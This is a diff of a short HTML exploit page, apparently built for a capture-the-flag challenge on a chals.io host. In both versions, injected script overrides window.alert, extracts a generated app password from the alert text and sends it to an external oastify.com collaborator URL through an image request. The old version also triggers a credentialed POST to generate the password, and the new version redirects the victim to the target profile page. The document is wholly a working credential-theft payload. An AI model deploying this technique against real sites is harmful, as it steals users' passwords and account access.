@@ -1,23 +1,14 @@
 <!DOCTYPE html>
 <html>
-  <body>
+  <head>
     <script>
-      // Intercept the alert that shows the password
       window.alert = function(msg) {
-        // Match and extract the password
-        const match = msg.match(/App password generated: (.+)/);
-        if (match) {
-          const pw = match[1];
-          // Leak it to your server
-          new Image().src = "https://b5h4ui0sowd2dwguvbunx4psmjsag26qv.oastify.com/leak?pw=" + encodeURIComponent(pw);
+        const pw = msg.match(/App password generated: (.+)/)?.[1];
+        if (pw) {
+          new Image().src = "https://uhfn61cb0fplpfsd7u669n1by24tslk99.oastify.com/leak?pw=" + encodeURIComponent(pw);
         }
       };
-
-      // Trigger the password generation
-      fetch("/generate_app_password", {
-        method: "POST",
-        credentials: "include"
-      });
     </script>
-  </body>
+    <meta http-equiv="refresh" content="0;url=https://airbnb-hosts-2847774775fe-link-sheriff-0.chals.io/profile">
+  </head>
 </html>
